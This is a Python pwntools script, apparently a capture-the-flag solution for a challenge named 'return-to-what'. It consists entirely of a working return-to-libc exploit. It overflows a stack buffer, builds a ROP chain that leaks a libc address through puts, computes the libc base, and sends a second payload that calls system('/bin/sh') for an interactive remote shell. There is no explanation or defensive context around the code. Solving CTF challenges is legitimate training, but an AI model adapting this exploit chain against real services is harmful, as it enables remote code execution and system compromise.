from pwn import *

elf = ELF('./return-to-what')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = remote('chal.duc.tf', 30003)
#io = process(elf.path)
rop = ROP(elf)

puts_plt = elf.plt['puts']
main = elf.symbols['main']
libc_start_main = elf.symbols['__libc_start_main']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(puts_plt))
log.info("__libc_start_main: " + hex(libc_start_main))
log.info("pop rdi gadget: " + hex(pop_rdi))

base = b'A' * 56
print(io.recvline())
print(io.recvline())
payload = base + p64(pop_rdi) + p64(libc_start_main) + p64(puts_plt) + p64(main)
io.sendline(payload)
recieved = io.recvline().strip()
print(recieved)
print(io.recvline())

leak = u64(recieved.ljust(8, b'\x00'))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))
libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

binsh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

log.info("/bin/sh %s " % hex(binsh))
log.info("system %s " % hex(system))

payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()